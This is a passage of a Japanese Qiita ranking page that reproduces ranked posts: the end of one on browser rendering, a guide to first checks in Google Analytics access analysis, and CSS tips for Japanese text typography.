<p>最後にピクセルにしたレイヤーを合成して最終的なレンダリング結果を生成。<br>
レイヤーは基本的にCPUによって合成されるが、transformCSSプロパティに3D変形関数をつけたり、いくつかの条件を満たすとGPUによって合成される。</p>

<p>レンダリング完成 (๑•̀ㅂ•́)و✧</p>

<h2>
<span id="実際に見てみた" class="fragment"></span><a href="#%E5%AE%9F%E9%9A%9B%E3%81%AB%E8%A6%8B%E3%81%A6%E3%81%BF%E3%81%9F"><i class="fa fa-link"></i></a>実際に見てみた</h2>

<p>Chromeのディベロッパーツールを使うとレンダリングの流れが表示される。<br>
Performanceタブで ⌘Eを押して検証開始。<br>
今回は1ページを表示させるのにどう動いたか知りたかったので、shift+⌘E。<br>
<a href="https://camo.qiitausercontent.com/807e8ede4b3cc25f5dd38d097e9c5d83e5f723b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f33646137313164612d323735372d353035342d363965322d3531663535653334376637612e706e67" target="_blank" rel="nofollow noopener"><img width="719" alt=" 2017-09-21 15.55.52.png" src="https://camo.qiitausercontent.com/807e8ede4b3cc25f5dd38d097e9c5d83e5f723b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f33646137313164612d323735372d353035342d363965322d3531663535653334376637612e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/42808/3da711da-2757-5054-69e2-51f55e347f7a.png"></a><br>
(赤枠で囲ったのが上で説明してたところの処理)</p>

<p>ファイルの読み込み順も見れる<br>
<a href="https://camo.qiitausercontent.com/5bb608c941c4bcb5a66723e80e1739b8ddf63bc9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f61383864323164322d326631312d383562332d346339392d6338663936633230353731312e706e67" target="_blank" rel="nofollow noopener"><img width="1387" alt=" 2017-09-21 16.10.50.png" src="https://camo.qiitausercontent.com/5bb608c941c4bcb5a66723e80e1739b8ddf63bc9/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f34323830382f61383864323164322d326631312d383562332d346339392d6338663936633230353731312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/42808/a88d21d2-2f11-85b3-4c99-c8f96c205711.png"></a><br>
<strong>HTML→CSS→JS→画像</strong>の順に読み込まれてるのがよく分かる！</p>

<h2>
<span id="調べてみて" class="fragment"></span><a href="#%E8%AA%BF%E3%81%B9%E3%81%A6%E3%81%BF%E3%81%A6"><i class="fa fa-link"></i></a>調べてみて</h2>

<p>本にはもっと細かく書いてあるんですけど、まだまだプロコトルの話とかよく分かんなくて...</p>

<p>でも流れや構造が分かってよかった！<br>
これから「私達が書いてるコードがこの流れにどう影響が出るのか」を理解していきたいです。<br>
勉強することいっぱいだー(｡ŏ﹏ŏ)</p>

<p>あと、こういう長い記事書く時のコツとかも覚えたい。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">21位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>441</kbd>
		<a target="_blank" href="https://qiita.com/mr_word_wide/items/a4ae7d61d15504a566ce">「GoogleAnalytics見てアクセス解析して」って言われた時にまずしていること</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-17<br />12:41:07</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/207239.html">mr_word_wide</a>(2件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/207239/profile-images/1510902873">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GoogleAnalytics]</b> <b>[データ分析]</b> <b>[アクセス解析]</b> <b>[ウェブ制作]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h2>

<p>僕はウェブサイト制作会社でサイトの運用・アクセス解析担当をしている者です。<br>
ウェブサイトの制作・リニューアルを受注した際にプロジェクトに参加し、クライアントの現状サイトのアクセス解析とレポート作成、リニューアル提案が主な仕事です。</p>

<p>クライアントと直接相対するディレクターから「GoogleAnalyticsの権限もらったからアクセス解析して」とオーダーを受け、アクセス解析を行うことになります。</p>

<p>そもそも、初めて見るサイトを構造から理解し、リニューアルに資する提案ができるようなインサイトを得るまで分析するのは本当に骨が折れます。</p>

<p>さらに（全くの主観ですが）、多くのクライアントはGoogleAnalyticsを「タグ貼っただけ」状態で放置しています。<br>
そのため、計測したデータが整理されていない・そもそも正しく計測できていないということはよく起こります。<br>
そして、そのような計測エラーがノイズの要因となるわけですが、そのノイズに気付くのはレポート作成時・・・となると、解析当初のステップに戻ることになります。目も当てられません。</p>

<p>そんなノイズをかいくぐりながら効率よくレポート作成に入っていくために、まずしていること・チェックしているポイントを紹介します。</p>

<p>「GoogleAnalyticsの設定ってなんでこんないっぱいあるの？どういう意味があるの？」といった疑問をお持ちの方に参考にしていただけると嬉しいです。</p>

<h2>
<span id="1まずちゃんと設定していないんだろうな前提のアラ探し" class="fragment"></span><a href="#1%E3%81%BE%E3%81%9A%E3%81%A1%E3%82%83%E3%82%93%E3%81%A8%E8%A8%AD%E5%AE%9A%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%82%93%E3%81%A0%E3%82%8D%E3%81%86%E3%81%AA%E5%89%8D%E6%8F%90%E3%81%AE%E3%82%A2%E3%83%A9%E6%8E%A2%E3%81%97"><i class="fa fa-link"></i></a>1.まず「ちゃんと設定していないんだろうな」前提のアラ探し</h2>

<h3>
<span id="そもそもプロパティとビューの設定を見る" class="fragment"></span><a href="#%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E3%83%97%E3%83%AD%E3%83%91%E3%83%86%E3%82%A3%E3%81%A8%E3%83%93%E3%83%A5%E3%83%BC%E3%81%AE%E8%A8%AD%E5%AE%9A%E3%82%92%E8%A6%8B%E3%82%8B"><i class="fa fa-link"></i></a>そもそもプロパティとビューの設定を見る</h3>

<p>基本は&lt;すべてのウェブサイトのデータ&gt;のビューだけを見ます。<br>
（※基本的にディレクトリごとにビューを分けるメリットは全くありません。チャネル・PV/SS等々、いろいろな指標が信頼できなくなっていきます。即座にやめたほうがいいと思います。）<br>
実務上、レポート対象のドメインのプロパティがない、などは即アラートを出す必要があります。<br>
また、サブドメインがあるサイトなのにプロパティが一つしかない場合は、後述しますが要注意です。</p>

<h3>
<span id="フィルタ" class="fragment"></span><a href="#%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF"><i class="fa fa-link"></i></a>フィルタ</h3>

<p>アクセス解析に使うビューを決めたら、次はIPやテスト環境からのトラフィックを除外するフィルタが入っているかを確認します。フィルタが何も設定されていないなら、自社やパートナーなどの関係者のトラフィックが間違いなく入っているということになります。<br>
経験上、「半分以上が関係者のトラフィックでした」「サイト制作会社のデバッグでPV/SSが高まってました（どんなデバッグ？）」というケースがあったので、まずチェックするようにしています。</p>

<h3>
<span id="季節変動があるかどうか" class="fragment"></span><a href="#%E5%AD%A3%E7%AF%80%E5%A4%89%E5%8B%95%E3%81%8C%E3%81%82%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B"><i class="fa fa-link"></i></a>季節変動があるかどうか</h3>

<p>ここからGoogleAnalyticsのレポートに入ります。<br>
ユーザー &gt; 概要　のレポートから、12ヶ月分のマンスリーのセッション数を見ます。<br>
リリース直後のサイトで12ヶ月分データがないときは、できるだけ長い期間をとってデータを見ましょう。<br>
全体のセッション数からサイトの規模感を掴むとともに、セッション数が著しく増減する時期がないかを見ます。</p>

<h3>
<span id="言語" class="fragment"></span><a href="#%E8%A8%80%E8%AA%9E"><i class="fa fa-link"></i></a>言語</h3>

<p>そのまま ユーザー &gt; 概要 のレポートで。下の方にスクロールすれば言語とセッション数が並んだ表があるはずです。<br>
このとき見るのは「どの国からのトラフィックが多いか」などではなく「どの程度スパムが入っているか」です。<br>
言語のフィールドに顔文字が入っていたり、定番のcとかがどの程度入っているかを確認します。<br>
そのようなスパムのトラフィックが10%とかある場合は、データ抽出時に気をつけるようにします。</p>

<h3>
<span id="ネットワークドメイン" class="fragment"></span><a href="#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>ネットワークドメイン</h3>

<p>行動 &gt; サイトコンテンツ &gt; すべてのページ（例なのでレポート画面はどこでもいいです）で、プライマリディメンションにネットワークドメインを入れてみます。このステップもスパムがどの程度あるかをチェックする目的です。<br>
基本はocn、sp-mode、aunetが多いのをサラッと確認するくらいでいいと思いますが、トラフィック比率の上位にスパム系のネットワークドメインがあった場合はチェックしておきます。</p>

<h3>
<span id="ホスト名" class="fragment"></span><a href="#%E3%83%9B%E3%82%B9%E3%83%88%E5%90%8D"><i class="fa fa-link"></i></a>ホスト名</h3>

<p>これも　行動 &gt; サイトコンテンツ &gt; すべてのページ（例なのでレポート画面はどこでもいいです）で、プライマリディメンションにホスト名を入れます。<br>
機械的にGoogleAnalyticsのスクリプトをいろんなサイトにコピペしていると、なんの設定もせずクロスドメイントラッキングをしてしまっているケースがあります（これホントによくあります）。<br>
複数ドメインを運営しているサイトであれば、このステップは必須です。<br>
また、テスト環境のドメインが分かれていれば、ここでテストトラフィックが混じっているのも気付くことができます。</p>

<h3>
<span id="クロスドメイントラッキングしているサイトリファラ除外がしてあるか" class="fragment"></span><a href="#%E3%82%AF%E3%83%AD%E3%82%B9%E3%83%89%E3%83%A1%E3%82%A4%E3%83%B3%E3%83%88%E3%83%A9%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%83%95%E3%82%A1%E3%83%A9%E9%99%A4%E5%A4%96%E3%81%8C%E3%81%97%E3%81%A6%E3%81%82%E3%82%8B%E3%81%8B"><i class="fa fa-link"></i></a>（クロスドメイントラッキングしているサイト）リファラ除外がしてあるか</h3>

<p>プロパティ設定からリファラ除外設定を見ておきましょう。</p>

<h3>
<span id="1のまとめ" class="fragment"></span><a href="#1%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>【1.のまとめ】</h3>

<p>ここまでのステップで、バグやおかしなデータを洗い出しました。<br>
そのようなデータが入っていると発覚した時点でGoogleAnalyticsのレポートは現実を反映していないことになってしまい、ミスリードの地雷原化しているのですが、依頼されたからにはもうなんとかする他ありません。<br>
ここまでで、とりあえず地雷が埋まっているんだということだけ把握しておきましょう。</p>

<h2>
<span id="2依頼主がウェブでやりたいことを推測する" class="fragment"></span><a href="#2%E4%BE%9D%E9%A0%BC%E4%B8%BB%E3%81%8C%E3%82%A6%E3%82%A7%E3%83%96%E3%81%A7%E3%82%84%E3%82%8A%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8%E3%82%92%E6%8E%A8%E6%B8%AC%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>2.依頼主がウェブでやりたいことを推測する</h2>

<h3>
<span id="adwords--searchconsoleリンク設定" class="fragment"></span><a href="#adwords--searchconsole%E3%83%AA%E3%83%B3%E3%82%AF%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>Adwords / SearchConsoleリンク設定</h3>

<p>集客 &gt; Adwords &gt; キャンペーン と 集客 &gt; SearchConsole &gt; 検索クエリ のレポートを見ます。<br>
Adwordsは広告費の価格感や入札キーワード、広告グループの切り方などでウェブサイトへの力の入れ具合やウェブサイトのターゲットが誰なのか、現状ターゲットに対してコミュニケーションできているのかいないのか、等々、クライアントの要望を実現してあげるためのヒントになります。</p>

<p>SearchConsoleは優先度が非常に高いですね。GoogleAnalyticsだけでは検索キーワードが把握できません。<br>
SearchConsoleがそもそも設定されていない場合は、GoogleAnalyticsにリンクさせなくてもよいので、すぐに設定を提案しましょう。</p>

<h3>
<span id="コンテンツグループ" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97"><i class="fa fa-link"></i></a>コンテンツグループ</h3>

<p>設定しててくれると助かるな〜程度です。<br>
設定されていた場合は、どのようなルールで設定されているのか見ておきます。<br>
レポートに落としていく段階で、例えばサイトのディレクトリ構成がくちゃくちゃだと、集計に骨が折れます。「行動フロー」のレポートを見るなら、コンテンツグループは必須です。プライマリディメンションに「ランディングページのコンテンツグループ」を入れられるとレポートが作りやすいという点もあります（その程度です）。</p>

<p>そして裏テーマとしては、クライアントが自社のコンテンツをどう捉えているのかを知ることができます。<br>
例えばサイト内にコラムがあったとして、それは「コラム」と一括りのグループにしているのか、記事のカテゴリごとにグループ分けしてあるのかで、コラムに対する力の入れ方が推定できるように思います。</p>

<h3>
<span id="チャネル" class="fragment"></span><a href="#%E3%83%81%E3%83%A3%E3%83%8D%E3%83%AB"><i class="fa fa-link"></i></a>チャネル</h3>

<p>定番ですね。集客 &gt; すべてのトラフィック　&gt; チャネル　のレポートを確認します。<br>
アラ探し観点では、チャネルの振り分けミスがないかを見ておきます。criteoやYDNがリファラに入っているケース、めちゃくちゃ多いです。<br>
GoogleAnalyticsをほったらかしにしている会社に多いのが、Directが異様に多いケース。アプリやソーシャル集客のパラメータ漏れが考えられますので、このタイミングでなんとなく要因を推定しておきます。だいたい日単位でセッション数のグラフを見ると、要因が推定できるケースが多いですね。<br>
また、直帰率99%かつ新規率99%みたいなトラフィックがあれば、まずそれはスパムだと思います。言語とかネットワークドメインとかをつけてチェックしてみましょう。<br>
やりたいこと推測の観点では、（Adwords含めて）集客チャネルの把握です。カスタムチャネル設定がしてあれば当然チェック、リファラは数の多少によらず見るようにしておきたいです。</p>

<h3>
<span id="イベント" class="fragment"></span><a href="#%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>イベント</h3>

<p>クライアントがサイト内のどの行動を計測したかったのか、を把握しておきます。<br>
クリックやスクロールを計測してるくらいなら後の分析フェイズでじっくり見ますが、なにか変わったイベントを送信しているならアクション・ラベルを見ておきましょう。</p>

<h3>
<span id="カスタムディメンション" class="fragment"></span><a href="#%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%83%87%E3%82%A3%E3%83%A1%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>カスタムディメンション</h3>

<p>イベントと同じで、どんなユーザー情報を送信しているのか知っておきましょう（実務上は、ほぼ「どこどこJP入ってるか確認」な気もしますね）。</p>

<h3>
<span id="コンバージョン" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>コンバージョン</h3>

<p>これも上と同じです。サイト内のどの行動を重要視しているのかを知っておきます。わかりやすくサンクスページ1つだけにコンバージョンを入れているなら、CVRを把握しておきましょう。</p>

<h3>
<span id="デバイス" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9"><i class="fa fa-link"></i></a>デバイス</h3>

<p>セッション数の比率は知っておきましょう。<br>
サイトの性格にもよりますが、なんとなくSP:PC:タブレット=65:30:5　くらいかな〜とあたりをつけて見始めるものですが、あたりから大ズレしている場合は要因の推定をしておきます。</p>

<h3>
<span id="2のまとめ" class="fragment"></span><a href="#2%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>【2.のまとめ】</h3>

<p>ここまでで、ウェブほったらかしなのか、それともちゃんと力を入れているのか、クライアントの温度感を推測します。<br>
ほったらかしなのであればウェブ屋として動機づけをする提案が必要です。手を入れているのであればその取り組みに対して評価・助言してあげる必要があります。<br>
若干実務的な部分も入りましたが、ここまではサラッと30分くらいで済ませて、データ抽出と提案作りに全力で入っていきましょう。</p>

<h2>
<span id="おまけのちのちのレポートを楽にするためにカスタムレポート" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91%E3%81%AE%E3%81%A1%E3%81%AE%E3%81%A1%E3%81%AE%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88%E3%82%92%E6%A5%BD%E3%81%AB%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AB%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88"><i class="fa fa-link"></i></a>（おまけ）のちのちのレポートを楽にするためにカスタムレポート</h2>

<p>ホスト名からドリルダウンするカスタムレポートを作る場合が多いです。<br>
ホスト名 &gt; デバイス &gt; 第一階層 &gt; ランディングページ って感じでしょうか。<br>
指標はページビュー、閲覧開始数、あとは必要なものをつど追加します。</p>

<h2>
<span id="最後に" class="fragment"></span><a href="#%E6%9C%80%E5%BE%8C%E3%81%AB"><i class="fa fa-link"></i></a>最後に</h2>

<h3>
<span id="これくらいはちゃんとやっときましょうよが本心" class="fragment"></span><a href="#%E3%81%93%E3%82%8C%E3%81%8F%E3%82%89%E3%81%84%E3%81%AF%E3%81%A1%E3%82%83%E3%82%93%E3%81%A8%E3%82%84%E3%81%A3%E3%81%A8%E3%81%8D%E3%81%BE%E3%81%97%E3%82%87%E3%81%86%E3%82%88%E3%81%8C%E6%9C%AC%E5%BF%83"><i class="fa fa-link"></i></a>「これくらいはちゃんとやっときましょうよ」が本心</h3>

<p>この記事を読んでいただいた方は、上記の内容について「あるある」と言える方が多いんじゃないでしょうか。<br>
自社のウェブサイトを正しく把握することがGoogleAnalyticsを導入する目的だと思います。<br>
その上で、「GoogleAnalytics置いただけ」で発生する計測誤差は認識しておきましょう。<br>
また、サイトの目的を定義し、追いかけて行く上で、GoogleAnalyticsの個別設定（コンテンツグループ・イベント・カスタムディメンション/指標）は不可欠だと思います。これらも仕組みを把握し、きちんと設定しておくのが望ましいでしょう。</p>

<p>お手伝いできることがあれば、ぜひお声がけ下さい（営業）。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">22位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>424</kbd>
		<a target="_blank" href="https://qiita.com/ryosukemaehira/items/3af1196b9947dec79ed5">もし、HTMLのテキスト周りでデザイナーからこんなお願いをされたら...</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-20<br />11:25:08</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/107419.html">ryosukemaehira</a>(3件の記事)<br />(PARK, Inc.  / RUC, Inc. / TECH::CAMP 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/107419/profile-images/1473710245">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[HTML5]</b> <b>[CSS3]</b> <b>[フロントエンド]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>HTMLのテキストはPhotoshopのように融通が効かないから、デザイナーからの細かいお願いはだいたい断っている...なんてことありませんか？<br>
モダンブラウザは色んなプロパティが対応してきているので、できることも増えています。<br>
今回は、知っているといざというとき便利なテキスト周りのCSSを集めてみました。</p>

<h1>
<span id="日本語文字詰めできないかなほらこのカタカナとかキモい" class="fragment"></span><a href="#%E6%97%A5%E6%9C%AC%E8%AA%9E%E6%96%87%E5%AD%97%E8%A9%B0%E3%82%81%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E3%81%8B%E3%81%AA%E3%81%BB%E3%82%89%E3%81%93%E3%81%AE%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A%E3%81%A8%E3%81%8B%E3%82%AD%E3%83%A2%E3%81%84"><i class="fa fa-link"></i></a>「日本語、文字詰めできないかな？ほら、このカタカナとかキモい。。」</h1>

<p><strong>「Webで文字詰めだと？無理なんだよあきらめな！」</strong>なんていう時代はもうとうに過ぎ去っています。OpenTypeのフォントであれば、<strong>日本語でもちゃんと文字詰めできる</strong>んです。</p>

<div class="code-frame" data-lang="CSS"><div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">class</span> <span class="p">{</span>
  <span class="kp">-moz-</span><span class="k">font-feature-settings</span><span class="p">:</span> <span class="s2">"palt"</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="k">font-feature-settings</span><span class="p">:</span> <span class="s2">"palt"</span><span class="p">;</span>
  <span class="k">font-feature-settings</span><span class="p">:</span> <span class="s2">"palt"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>↓こんなかんじで文字詰めできます。<br>
<a href="https://gyazo.com/6f81f97d40593e15e9a762e05d871952" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/50336d97ad0f42a265f97bf2957e49128b498e4f/68747470733a2f2f6779617a6f2e636f6d2f36663831663937643430353933653135653961373632653035643837313935322f726177" alt="Screenshot from Gyazo" data-canonical-src="https://gyazo.com/6f81f97d40593e15e9a762e05d871952/raw"></a></p>

<p>ただし、letter-spacingを設定していない場合、わりとぎゅっと詰まってしまうので、必要に応じてletter-spacingを設定しましょう。</p>

<h2>
<span id="font-feature-settings-normalデフォルトの場合" class="fragment"></span><a href="#font-feature-settings-normal%E3%83%87%E3%83%95%E3%82%A9%E3%83%AB%E3%83%88%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><strong>font-feature-settings: normal;(デフォルト)の場合</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/17c558c1b8d80bf200b78917f61e151a1cddb4e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130373431392f35626536393838622d656130312d633137632d333962362d3962336539653665323964662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/17c558c1b8d80bf200b78917f61e151a1cddb4e6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130373431392f35626536393838622d656130312d633137632d333962362d3962336539653665323964662e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/107419/5be6988b-ea01-c17c-39b6-9b3e9e6e29df.png"></a><br>
全ての文字が等幅の枠の中に収まっていますね。</p>

<h2>
<span id="font-feature-settings-palt-の場合" class="fragment"></span><a href="#font-feature-settings-palt-%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a><strong>font-feature-settings: "palt"; の場合</strong>
</h2>

<p><a href="https://camo.qiitausercontent.com/d818880231538d8442fb28afbb498b3525200f9a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130373431392f30386465396337652d396534622d633364382d613434392d3937643535623664313731632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d818880231538d8442fb28afbb498b3525200f9a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3130373431392f30386465396337652d396534622d633364382d613434392d3937643535623664313731632e706e67" alt="image.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/107419/08de9c7e-9e4b-c3d8-a449-97d55b6d171c.png"></a><br>
文字によって、広くなったり狭くなったりしています。</p>

<h3>
<span id="参考" class="fragment"></span><a href="#%E5%8F%82%E8%80%83"><i class="fa fa-link"></i></a>参考</h3>

<p>これがすごく良記事なので、参考までにどうぞ<br>
<a href="https://ics.media/entry/14087" rel="nofollow noopener" target="_blank">文字詰めできるCSSのfont-feature-settingsが凄い！ 日本語フォントこそ指定したい自動カーニング</a></p>

<p>ざくっとまとめると、Webにおける和文フォントは基本的に正方形の中に文字が収まるようになっているけど、<strong>プロポーショナルメトリクス（文字固有の横幅）に応じて字間を詰めることができる</strong>んだよ。ということです。</p>

<h1>
<span id="あ欧文フォントがリガチャしちゃってるんだけど外してくれないかな" class="fragment"></span><a href="#%E3%81%82%E6%AC%A7%E6%96%87%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88%E3%81%8C%E3%83%AA%E3%82%AC%E3%83%81%E3%83%A3%E3%81%97%E3%81%A1%E3%82%83%E3%81%A3%E3%81%A6%E3%82%8B%E3%82%93%E3%81%A0%E3%81%91%E3%81%A9%E5%A4%96%E3%81%97%E3%81%A6%E3%81%8F%E3%82%8C%E3%81%AA%E3%81%84%E3%81%8B%E3%81%AA"><i class="fa fa-link"></i></a>「あ、欧文フォントがリガチャしちゃってるんだけど、外してくれないかな？」</h1>

<p>そもそもリガチャって何だよ！なんて言わないでください。</p>

<div class="code-frame" data-lang="CSS"><div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">class</span> <span class="p">{</span>
  <span class="k">font-variant-ligatures</span><span class="p">:</span> <span class="n">no-common-ligatures</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>fとiなど、<strong>特定の文字と文字がくっついて１文字扱いになっている</strong>状態が「リガチャ（合字）」です。<br>
デフォルトでリガチャしますが、好みだったり、letter-spacingとの兼ね合いで、外した方がいい場合があります。</p>

<p><a href="https://gyazo.com/57f4a489b4e12726ca2bd1483d9fc77b" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/425f784112f261b224b42a3d5bde15785083edbf/68747470733a2f2f6779617a6f2e636f6d2f35376634613438396234653132373236636132626431343833643966633737622f726177" alt="Screenshot from Gyazo" data-canonical-src="https://gyazo.com/57f4a489b4e12726ca2bd1483d9fc77b/raw"></a></p>

<p>※等幅フォントなど、そもそもリガチャという概念が存在しないフォントもあるので、その場合は何もきにする必要はありません。</p>

<h1>
<span id="ここのpタグのところいい感じに左右両端を揃えたいんだけど" class="fragment"></span><a href="#%E3%81%93%E3%81%93%E3%81%AEp%E3%82%BF%E3%82%B0%E3%81%AE%E3%81%A8%E3%81%93%E3%82%8D%E3%81%84%E3%81%84%E6%84%9F%E3%81%98%E3%81%AB%E5%B7%A6%E5%8F%B3%E4%B8%A1%E7%AB%AF%E3%82%92%E6%8F%83%E3%81%88%E3%81%9F%E3%81%84%E3%82%93%E3%81%A0%E3%81%91%E3%81%A9"><i class="fa fa-link"></i></a>「ここのpタグ？のところ？いい感じに左右両端を揃えたいんだけど...」</h1>

<p>CSSがいい感じにやってくれます。</p>

<div class="code-frame" data-lang="CSS"><div class="highlight"><pre><span></span><span class="p">.</span><span class="nc">class</span> <span class="p">{</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">justify</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>こんな感じになります。<br>
<a href="https://gyazo.com/faa2a22b48f6fdde3c4cdef55178a5c8" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/83f04afb4c96c8396730806ac1f763c2bbfd1b7f/68747470733a2f2f6779617a6f2e636f6d2f66616132613232623438663666646465336334636465663535313738613563382f726177" alt="Screenshot from Gyazo" data-canonical-src="https://gyazo.com/faa2a22b48f6fdde3c4cdef55178a5c8/raw"></a></p>

<h1>
<span id="なんかモックよりフォント太くないboldとか潰れちゃt" class="fragment"></span><a href="#%E3%81%AA%E3%82%93%E3%81%8B%E3%83%A2%E3%83%83%E3%82%AF%E3%82%88%E3%82%8A%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88%E5%A4%AA%E3%81%8F%E3%81%AA%E3%81%84bold%E3%81%A8%E3%81%8B%E6%BD%B0%E3%82%8C%E3%81%A1%E3%82%83t"><i class="fa fa-link"></i></a>「なんかモックよりフォント太くない？Boldとか潰れちゃt..」</h1>

<p>ブランザのフォントのレンダリングの方法の違いによる差です。<br>
2017年秋の最適解はこちらの模様。</p>

<div class="code-frame" data-lang="SCSS"><div class="highlight"><pre><span></span><span class="nt">body</span> <span class="p">{</span>
  <span class="nt">-webkit-font-smoothing</span><span class="nd">:</span> <span class="nt">subpixel-antialiased</span><span class="o">;</span>
  <span class="nt">-moz-osx-font-smoothing</span><span class="nd">:</span> <span class="nt">unset</span><span class="o">;</span>
  <span class="o">@</span><span class="nt">media</span> <span class="nt">only</span> <span class="nt">screen</span> <span class="nt">and</span><span class="o">(</span><span class="nt">-webkit-min-device-pixel-ratio</span><span class="nd">:</span> <span class="nt">2</span><span class="o">),(</span><span class="nt">min-resolution</span><span class="nd">:</span> <span class="nt">2dppx</span><span class="o">)</span> <span class="p">{</span>
    <span class="nt">-webkit-font-smoothing</span><span class="nd">:</span> <span class="nt">antialiased</span><span class="o">;</span>
    <span class="nt">-moz-osx-font-smoothing</span><span class="nd">:</span> <span class="nt">grayscale</span><span class="o">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p>出典：<a href="http://creator.dwango.co.jp/14128.html" rel="nofollow noopener" target="_blank">「Webブラウザにおける文字のアンチエイリアスの現状の最適解」</a></p>

<p>もともとフォントはベクターで構成されていて、それをピクセルの世界で表現する（ラスタライズする）際に、ジャギるのを防ぐためにアンチエイリアスをかけているのですが、その手法を制御しようとするものです。</p>

